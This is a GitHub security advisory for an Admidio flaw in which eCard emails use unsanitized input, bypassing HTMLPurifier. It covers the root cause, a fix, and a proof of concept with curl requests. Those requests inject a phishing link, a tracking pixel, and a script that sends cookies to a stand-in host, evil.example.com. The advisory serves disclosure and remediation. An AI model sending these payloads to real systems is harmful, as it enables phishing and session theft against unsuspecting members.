# [M] Admidio has an HTMLPurifier Bypass in eCard Message Allows HTML Email Injection

## Summary
Severity: Medium
Advisory: GHSA-4wr4-f2qf-x5wj
CVE: CVE-2026-32757
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-4wr4-f2qf-x5wj
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.7

## Details
## Summary

The eCard send handler in Admidio uses the raw `$_POST['ecard_message']` value instead of the HTMLPurifier-sanitized `$formValues['ecard_message']` when constructing the greeting card HTML. This allows an authenticated attacker to inject arbitrary HTML and JavaScript into greeting card emails sent to other members, bypassing the server-side HTMLPurifier sanitization that is properly applied to the `ecard_message` field during form validation.

## Details

### Root Cause

File: `D:\bugcrowd\admidio\repo\modules\photos\ecard_send.php`

At line 38, the raw POST value is captured BEFORE form validation runs:

```php
$postMessage = $_POST['ecard_message'];  // Line 38: RAW value
```

At line 61, the form validation runs and properly sanitizes the message through HTMLPurifier (since ecard_message is registered as an editor field):

```php
$formValues = $photosEcardSendForm->validate($_POST);  // Line 61: sanitized
```

The sanitized value is stored in `$formValues['ecard_message']`, but this value is never used. Instead, the raw `$postMessage` is passed to `parseEcardTemplate()` at lines 159 and 201:

```php
$ecardHtmlData = $funcClass->parseEcardTemplate($imageUrl, $postMessage, ...);  // Line 159
$ecardHtmlData = $funcClass->parseEcardTemplate($imageUrl, $postMessage, ...);  // Line 201
```

### Template Injection

File: `D:\bugcrowd\admidio\repo\src\Photos\ValueObject\ECard.php`, line 144

The `parseEcardTemplate()` method places the message directly into the HTML template without any encoding:

```php
$pregRepArray['/<%ecard_message%>/'] = $ecardMessage;  // Line 144: no encoding
```

Compare this to the recipient fields which ARE properly encoded:

```php
$pregRepArray['/<%ecard_reciepient_email%>/'] = SecurityUtils::encodeHTML($recipientEmail);  // Line 135
$pregRepArray['/<%ecard_reciepient_name%>/']  = SecurityUtils::encodeHTML($recipientName);   // Line 136
```

### Inconsistency with Preview

File: `D:\bugcrowd\admidio\repo\modules\photos\ecard_preview.php`, line 56

The preview correctly uses the sanitized value:

```php
$smarty->assign('ecardContent', $funcClass->parseEcardTemplate($imageUrl, $formValues['ecard_message'], ...));
```

This means the preview shows the sanitized version, but the actual sent email contains the unsanitized content.

### Delivery Mechanism

The unsanitized HTML is delivered via two channels:

1. **HTML Email** (primary vector): At line 218 of `ECard.php`, the parsed template is set as the email body via `$email->setText($ecardHtmlData)` followed by `$email->setHtmlMail()`. The malicious HTML is rendered by the recipient's email client.

2. **Database Storage**: At line 214 of `ecard_send.php`, `$message->addContent($ecardHtmlData)` stores the raw HTML in the messages table. However, `MessageContent::getValue()` applies `SecurityUtils::encodeHTML()` on output, mitigating the stored XSS in the web interface.

## PoC

**Prerequisites:** Logged-in user with access to the photo module and eCard feature enabled.

**Step 1: Send an eCard with injected HTML**

```
curl -X POST "https://TARGET/adm_program/modules/photos/ecard_send.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<session>" \
  -d "adm_csrf_token=<csrf_token>" \
  -d "ecard_template=<valid_template.tpl>" \
  -d "photo_uuid=<valid_photo_uuid>" \
  -d "photo_nr=1" \
  -d "ecard_message=<h1>Important Security Update</h1><p>Your account has been compromised. Please <a href='https://evil.example.com/phishing'>verify your identity here</a>.</p><img src='https://evil.example.com/tracking.gif'>" \
  -d "ecard_recipients[]=<target_user_uuid>"
```

The HTMLPurifier validation runs but its result is discarded. The raw HTML including the phishing link and tracking pixel is sent in the greeting card email.

**Step 2: Escalated payload with script injection**

```
curl -X POST "https://TARGET/adm_program/modules/photos/ecard_send.php" \
  -H "Cookie: ADMIDIO_SESSION_ID=<session>" \
  -d "adm_csrf_token=<csrf_token>" \
  -d "ecard_template=<valid_template.tpl>" \
  -d "photo_uuid=<valid_photo_uuid>" \
  -d "photo_nr=1" \
  -d "ecard_message=<script>document.location='https://evil.example.com/steal?cookie='+document.cookie</script>" \
  -d "ecard_recipients[]=<target_user_uuid>"
```

Most modern email clients block script execution, but older clients or webmail interfaces with relaxed CSP may execute it.

## Impact

- **Phishing via Trusted Sender:** The attacker sends crafted greeting cards that appear to come from the organization's system. The email sender address is the attacker's real address from their Admidio profile, but the email template and branding make it appear legitimate.
- **HTML Email Injection:** Arbitrary HTML content including fake forms, misleading links, and tracking pixels can be injected into emails sent to any member or role.
- **Scope Change:** The vulnerability crosses a security boundary -- the attack originates from the Admidio web application but impacts email recipients who may view the content outside of Admidio.
- **Bypasses Defense-in-Depth:** The HTMLPurifier sanitization is applied but its result is discarded, defeating the intended security control.

## Recommended Fix

In `ecard_send.php`, use the sanitized `$formValues['ecard_message']` instead of the raw `$_POST['ecard_message']`:

```php
// Line 38: Remove this line
// $postMessage = $_POST['ecard_message'];

// After line 61 (form validation), use the sanitized value:
$formValues = $photosEcardSendForm->validate($_POST);
$postMessage = $formValues['ecard_message'];
```

Additionally, in `ECard::parseEcardTemplate()`, apply encoding to the message placeholder as defense-in-depth, or at minimum document that the message is expected to contain trusted HTML:

```php
// The message has already been sanitized by HTMLPurifier,
// so it can safely contain allowed HTML tags
$pregRepArray['/<%ecard_message%>/'] = $ecardMessage;
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-4wr4-f2qf-x5wj
- https://nvd.nist.gov/vuln/detail/CVE-2026-32757
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.7
